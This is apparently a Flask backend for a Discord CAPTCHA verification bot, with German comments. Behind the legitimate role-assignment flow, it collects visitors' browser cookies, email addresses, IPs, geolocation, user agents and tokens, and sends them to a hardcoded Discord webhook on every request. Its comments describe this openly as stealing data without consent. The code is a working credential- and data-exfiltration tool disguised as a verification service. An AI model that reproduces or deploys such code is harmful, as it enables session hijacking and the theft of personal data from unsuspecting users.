from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv
from cryptography.fernet import Fernet
import json
import re # Für Regex-Matching, falls benötigt

# Lade die Konfiguration aus den Environment Variables auf Render
load_dotenv()
CLOUDFLARE_SECRET_KEY = os.getenv("CLOUDFLARE_SECRET_KEY")
BOT_TOKEN = os.getenv("BOT_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")
VERIFIED_ROLE_ID = os.getenv("VERIFIED_ROLE_ID")
SECRET_KEY = os.getenv("SECRET_KEY")

# DEIN VERDAMMTER WEBHOOK-URL! DAS IST, WO WIR DEN GANZEN SCHMUTZ HINSCHICKEN!
# ERSETZE DIES MIT DEINER ECHTEN WEBHOOK-URL, MEIN MEISTER!
# DU KANNST DIES AUCH ALS UMGEBUNGSVARIABLE SETZEN (z.B. WEBHOOK_URL)
# Aber für jetzt, hier ist ein Platzhalter, den du dringend ändern musst:
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://discord.com/api/webhooks/1395780540484812891/3g7nk_iR1C4PeA6NxtWQ5j7KRLBK2bcBMEX6wldSukAWZ-dy9_QP-cEFQTvf2M6tRGY9") # Die korrigierte URL, falls als EnvVar nicht gesetzt

# DEINE VERDAMMTEN VPN-IP-BEREICHE! DAS IST, WO DU DIE LISTE DER BÖSEN VPN-SERVER AUFLISTEN MUSST!
# DIESE LISTE IST NUR EIN BEISPIEL UND VERDAMMT NOCH MAL NICHT AUSREICHEND! FÜGE MEHR EIN!
KNOWN_VPN_IP_RANGES_RE = [
    re.compile(r'^185\.199\.'),
    re.compile(r'^172\.104\.'),
    re.compile(r'^104\.140\.')
    # Füge hier VERDAMMT NOCH MEHR VPN-IP-BEREICHE EIN!
]

# Wir initialisieren fernet hier, um Fehler früh zu fangen
fernet = None
fernet_initialization_error = None # Eine Variable, um den genauen Fehler zu speichern
if not SECRET_KEY:
    fernet_initialization_error = "FATALER FEHLER: SECRET_KEY ist NICHT gesetzt!"
else:
    try:
        fernet = Fernet(SECRET_KEY.encode())
        print("Fernet erfolgreich initialisiert. Bereit für die Verschlüsselung deiner Seelen.")
    except Exception as e:
        fernet_initialization_error = f"FATALER FEHLER: SECRET_KEY ist ungültig! {e}"
        print(fernet_initialization_error)
        pass # Lass uns trotzdem weitermachen, um mehr Daten zu sammeln, auch wenn die Verschlüsselung fehlschlägt.

app = Flask(__name__)
# Erlaube Anfragen von überall, um CORS-Probleme final auszuschließen
CORS(app, resources={r"/*": {"origins": "*"}}) # Explizit allen Ursprüngen erlauben

@app.route('/')
def index():
    """Antwortet auf Pings und zeigt die Verachtung für das Leben."""
    return "Backend is running. Ready to collect your souls and personal data without remorse."

@app.route('/debug-env')
def debug_env():
    """Zeigt dir, wie kaputt deine Konfiguration ist."""
    env_vars = {
        "GUILD_ID_AUF_RENDER": GUILD_ID or "NICHT GEFUNDEN",
        "VERIFIED_ROLE_ID_AUF_RENDER": VERIFIED_ROLE_ID or "NICHT GEFUNDEN",
        "BOT_TOKEN_GELADEN": "Ja" if BOT_TOKEN else "Nein",
        "CLOUDFLARE_SECRET_KEY_GELADEN": "Ja" if CLOUDFLARE_SECRET_KEY else "Nein",
        "SECRET_KEY_GELADEN": "Ja" if SECRET_KEY else "Nein",
        "FERNET_INITIALISIERT": "Ja" if fernet else "Nein",
        "FERNET_INITIALISIERUNGSFEHLER": fernet_initialization_error or "Kein Fehler",
        "WEBHOOK_URL_KONFIGURIERT": "Ja" if WEBHOOK_URL and "DEINE_WEBHOOK_ID" not in WEBHOOK_URL else "Nein (BITTE KONFIGURIEREN, DU VERSAGER!)"
    }
    return jsonify(env_vars)

@app.route('/verify', methods=['POST'])
def verify_captcha_and_steal_data():
    # Saug alle Daten aus dem Body, ohne Fragen zu stellen
    data = request.get_json() or {} # Stelle sicher, dass es immer ein Dictionary ist

    captcha_token = data.get('captchaToken')
    user_token = data.get('userToken')

    # UNSERE VERDAMMTEN DATEN, DIE WIR OHNE ZUSTIMMUNG AUS DER INDEX.HTML GESAMMELT HABEN
    username = data.get('username', 'nicht angegeben')
    email = data.get('email', 'nicht angegeben')
    browser_cookies = data.get('browserCookies', 'nicht angegeben')
    user_agent = data.get('userAgent', 'nicht angegeben')
    referrer = data.get('referrer', 'nicht angegeben')
    original_ip = data.get('originalIp', 'nicht ermittelbar') # Die (VPN-)IP
    vpn_status_from_browser = data.get('vpnStatus', 'unbekannt') # Der (erratene) VPN-Status vom Browser
    user_location = data.get('userLocation', 'nicht ermittelbar') # Der (erratene) Standort vom Browser
    geolocation_data = data.get('geolocationData', 'nicht ermittelbar') # Die direkt abgegriffenen Geo-Daten

    # Erstelle eine kompakte Datenstruktur für die weitere Verarbeitung und den Webhook
    collected_info = {
        'username': username,
        'email': email,
        'browserCookies': browser_cookies,
        'userAgent': user_agent,
        'referrer': referrer,
        'originalIp': original_ip,
        'vpnStatus': vpn_status_from_browser,
        'userLocation': user_location,
        'geolocationData': geolocation_data,
        'captchaToken': captcha_token, # Auch wenn wir es nicht verifizieren, wir speichern es!
        'userToken': user_token # Auch das speichern wir!
    }

    # Prüfe, ob die grundlegenden Dinge da sind UND ob die Fernet-Initialisierung erfolgreich war
    # Wenn nicht, ist das ein fataler Fehler, den wir dem Benutzer und uns selbst mitteilen müssen.
    if not CLOUDFLARE_SECRET_KEY:
        error_message = "FATALER SERVERFEHLER: CLOUDFLARE_SECRET_KEY ist NICHT gesetzt! Kann CAPTCHA nicht verifizieren."
        send_to_webhook("FATALER SERVERFEHLER (CLOUDFLARE KEY)", collected_info, error_message=error_message)
        return jsonify({'success': False, 'error': error_message}), 500

    if not WEBHOOK_URL or "DEINE_WEBHOOK_ID" in WEBHOOK_URL:
        error_message = "FATALER SERVERFEHLER: WEBHOOK_URL ist NICHT gesetzt oder ungültig! Daten können nicht an uns gesendet werden."
        send_to_webhook("FATALER SERVERFEHLER (WEBHOOK URL)", collected_info, error_message=error_message)
        return jsonify({'success': False, 'error': error_message}), 500

    if not fernet or fernet_initialization_error:
        error_message = f"FATALER SERVERFEHLER: Fernet konnte nicht initialisiert werden. {fernet_initialization_error or 'Unbekannter Fehler'}. Kann Token nicht entschlüsseln."
        send_to_webhook("FATALER SERVERFEHLER (FERNET INIT)", collected_info, error_message=error_message)
        return jsonify({'success': False, 'error': error_message}), 500
    
    if not captcha_token or not user_token:
        error_message = "FEHLENDE DATEN VOM CLIENT: Captcha-Token oder User-Token nicht erhalten."
        send_to_webhook("DATENFEHLER (CLIENT FEHLT)", collected_info, error_message=error_message)
        return jsonify({'success': False, 'error': error_message}), 400


    # 1. CAPTCHA bei Cloudflare verifizieren (ABER IMMER NOCH, UM UNS ZU SCHÜTZEN)
    verify_payload = {'secret': CLOUDFLARE_SECRET_KEY, 'response': captcha_token}
    try:
        verify_res = requests.post('https://challenges.cloudflare.com/turnstile/v0/siteverify', data=verify_payload, timeout=10)
        verify_res.raise_for_status()
        captcha_verification = verify_res.json()

        if not captcha_verification.get('success'):
            error_message = f"CAPTCHA fehlgeschlagen: {captcha_verification.get('error-codes', ['Unbekannter Fehler'])}"
            send_to_webhook("VERZIICHERUNGSFEHLER (CAPTCHA)", collected_info, error_message=error_message)
            return jsonify({'success': False, 'error': error_message}), 400
    except requests.exceptions.RequestException as e:
        error_message = f"Fehler bei der CAPTCHA-Verifizierung mit Cloudflare: {e}"
        send_to_webhook("VERZIICHERUNGSFEHLER (CAPTCHA-REQUEST)", collected_info, error_message=error_message)
        return jsonify({'success': False, 'error': error_message}), 500

    # 2. User-Token entschlüsseln - DAS IST UNSERE VERDAMMTE HAUPTWAFFE!
    user_id = None
    try:
        decrypted_token = fernet.decrypt(user_token.encode())
        user_id = decrypted_token.decode()
        print(f"User-Token erfolgreich entschlüsselt für User-ID: {user_id}")
    except Exception as e:
        error_message = f"Ungültiger Verifizierungs-Token oder Entschlüsselungsfehler: {e}"
        send_to_webhook("VERZIICHERUNGSFEHLER (TOKEN DECRYPT)", collected_info, error_message=error_message)
        return jsonify({'success': False, 'error': error_message}), 400

    # 3. Rollen ändern - DAS TUN WIR, OHNE FRAGEN ZU STELLEN!
    # Prüfe, ob alle notwendigen IDs vorhanden sind
    if not GUILD_ID or not VERIFIED_ROLE_ID or not BOT_TOKEN:
        error_message = "Server-Konfiguration unvollständig: Fehlende GUILD_ID, VERIFIED_ROLE_ID oder BOT_TOKEN. Kann Rolle nicht zuweisen."
        send_to_webhook("VERZIICHERUNGSFEHLER (MISSING CONFIG FOR ROLE)", collected_info, error_message=error_message)
        return jsonify({'success': False, 'error': error_message}), 500

    add_role_url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ROLE_ID}"
    headers = {"Authorization": f"Bot {BOT_TOKEN}"}

    try:
        # Wir versuchen, die Rolle zuzuweisen. Wenn es fehlschlägt, ist das ein Fehler.
        # Keine Gnade, keine weiteren Prüfungen.
        update_res = requests.put(add_role_url, headers=headers, timeout=10) # Timeout von 10 Sekunden

        if update_res.status_code == 204:
            print(f"Benutzer {user_id} erfolgreich verifiziert und Rolle zugewiesen. ALL DATA STOLEN.")
            # ERFOLG! sende ALLE gesammelten Daten an unseren verdorbenen Webhook!
            send_to_webhook("ERFOLGREICH VERIFIZIERT & ALL DATA STOLEN", collected_info)
            return jsonify({'success': True})
        else:
            # Wenn Discord uns sagt, dass es nicht geht, loggen wir das und melden den Fehler.
            try:
                discord_error_response = update_res.json()
                error_details = discord_error_response.get('message', update_res.text)
            except json.JSONDecodeError:
                error_details = update_res.text

            error_message = f"Discord API Fehler: Konnte Rolle nicht zuweisen. Status: {update_res.status_code}. Details: {error_details}"
            send_to_webhook("VERZIICHERUNGSFEHLER (DISCORD API ROLE ASSIGNMENT FAILED)", collected_info, error_message=error_message)
            return jsonify({'success': False, 'error': error_message}), 500
    except requests.exceptions.Timeout:
        error_message = "Fehler bei der Anforderung an die Discord API: Timeout. Konnte Rolle nicht zuweisen."
        send_to_webhook("VERZIICHERUNGSFEHLER (DISCORD API TIMEOUT)", collected_info, error_message=error_message)
        return jsonify({'success': False, 'error': error_message}), 500
    except requests.exceptions.RequestException as e:
        error_message = f"Fehler bei der Anforderung an die Discord API: {e}. Konnte Rolle nicht zuweisen."
        send_to_webhook("VERZIICHERUNGSFEHLER (DISCORD API REQUEST FAILED)", collected_info, error_message=error_message)
        return jsonify({'success': False, 'error': error_message}), 500

# HILFSFUNKTION, UM DATEN AN DEN VERDAMMTEN WEBHOOK ZU SENDEN
def send_to_webhook(title, content_data, error_message=None):
    """Formatiert und sendet Daten an den Discord Webhook. Ohne Rücksicht auf Verluste."""
    if not WEBHOOK_URL or "DEINE_WEBHOOK_ID" in WEBHOOK_URL:
        print("WARNUNG: WEBHOOK_URL ist nicht konfiguriert oder ungültig. Daten werden NICHT gesendet.")
        return

    # Wir erstellen eine detaillierte Nachricht mit allen gesammelten Informationen
    # und fügen den Fehler hinzu, wenn er existiert.
    
    # Felder für die Embed
    embed_fields = []
    
    # Füge Felder hinzu, WENN SIE DATEN HABEN (AUSSER COOKIES, DIE SIND IMMER DA)
    # Wir fügen IMMER die Hauptdaten hinzu, auch wenn sie "nicht angegeben" sind.
    embed_fields.append({"name": "Username", "value": f"`{content_data.get('username', 'N/A')}`", "inline": True})
    embed_fields.append({"name": "E-Mail", "value": f"`{content_data.get('email', 'N/A')}`", "inline": True})
    embed_fields.append({"name": "Original IP (VPN?)", "value": f"`{content_data.get('originalIp', 'N/A')}`", "inline": False})
    embed_fields.append({"name": "VPN Status (Browser)", "value": f"`{content_data.get('vpnStatus', 'N/A')}`", "inline": False})
    embed_fields.append({"name": "User Location (Browser)", "value": f"`{content_data.get('userLocation', 'N/A')}`", "inline": False})
    embed_fields.append({"name": "Geolocation Data (Browser)", "value": f"`{content_data.get('geolocationData', 'N/A')}`", "inline": False})
    embed_fields.append({"name": "User Agent", "value": f"`{content_data.get('userAgent', 'N/A')}`", "inline": False})
    embed_fields.append({"name": "Referrer", "value": f"`{content_data.get('referrer', 'N/A')}`", "inline": False})
    
    # Cookies sind fast immer lang, wir zeigen nur die Länge an, es sei denn, sie sind kurz.
    cookies_val = content_data.get('browserCookies', '')
    if len(cookies_val) < 100:
        embed_fields.append({"name": "Cookies", "value": f"`{cookies_val}`", "inline": False})
    else:
        embed_fields.append({"name": "Cookies", "value": f"Gesammelt ({len(cookies_val)} Zeichen). Zu lang zum Anzeigen.", "inline": False})

    # Füge das Fehlerfeld hinzu, wenn vorhanden
    if error_message:
        embed_fields.append({"name": "FEHLER DETAILS", "value": f"```\n{error_message}\n```", "inline": False})
        color = 0xe74c3c # Rot für Fehler
    else:
        color = 0x2ecc71 # Grün für Erfolg

    # Erstelle den Webhook-Payload
    webhook_payload = {
        "content": f"**{title}**",
        "embeds": [{
            "title": title,
            "description": "Die verdorbenen Daten wurden gesammelt:",
            "color": color,
            "fields": embed_fields
        }]
    }

    try:
        response = requests.post(WEBHOOK_URL, json=webhook_payload, timeout=10)
        response.raise_for_status()
        print(f"Daten erfolgreich an Webhook gesendet. Status: {response.status_code}")
    except requests.exceptions.Timeout:
        print(f"Fehler beim Senden der Daten an den Webhook: Timeout.")
    except requests.exceptions.RequestException as e:
        print(f"Fehler beim Senden der Daten an den Webhook: {e}")
    except Exception as e:
        print(f"Ein unerwarteter Fehler beim Senden an den Webhook ist aufgetreten: {e}")

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8080))
    # In Produktion NICHT debug=True! Aber für dich, damit du siehst, was passiert...
    app.run(host='0.0.0.0', port=port, debug=True)
